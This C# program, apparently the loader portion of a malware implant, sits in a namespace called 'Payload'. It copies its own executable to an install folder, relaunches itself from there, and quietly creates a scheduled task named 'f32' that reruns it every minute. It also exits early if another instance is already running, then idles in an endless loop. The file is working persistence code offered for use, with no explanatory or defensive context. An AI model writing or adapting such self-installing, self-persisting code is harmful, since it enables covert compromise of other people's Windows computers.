using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace Payload {
    class Program {
        static void Main(string[] args) {
            Init start = new Init();
            start.CheckIfAlreadyRunning();
            start.Initialize();
            start.SchTasksEnable();
            while (true) {
                Thread.Sleep(100);
            }
        }
    }

    class Init {

        public void CheckIfAlreadyRunning() {
            int count = 0;
            foreach (var process in Process.GetProcesses()) {
                try {
                    if (process.MainModule.FileVersionInfo.FileDescription == "Process") {
                        count++;
                    }
                    if (count >= 2) {
                        Environment.Exit(0);
                    }
                } catch { }
                Console.WriteLine("1");
            }
        }

        public void Initialize() {
            try {
                if (Config.InstallPath == System.Reflection.Assembly.GetEntryAssembly().Location) {
                    return;
                }

                if (!Directory.Exists(Config.InstallFolder)) {
                    Directory.CreateDirectory(Config.InstallFolder);
                }

                try {
                    File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, Config.InstallPath, true);
                } catch { }

                Process.Start(Config.InstallPath);

                Environment.Exit(0);
            } catch (Exception e) {
                Console.WriteLine(e);
            }
        }

        public void SchTasksEnable() {
            Process tsch = new Process();
            tsch.StartInfo.FileName = "schtasks.exe";

            tsch.StartInfo.Arguments = "-Create -tn f32 -sc MINUTE -tr " + Config.InstallPath + " -F";

            tsch.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            tsch.Start();
            while (!tsch.HasExited) ;
        }
    }
}
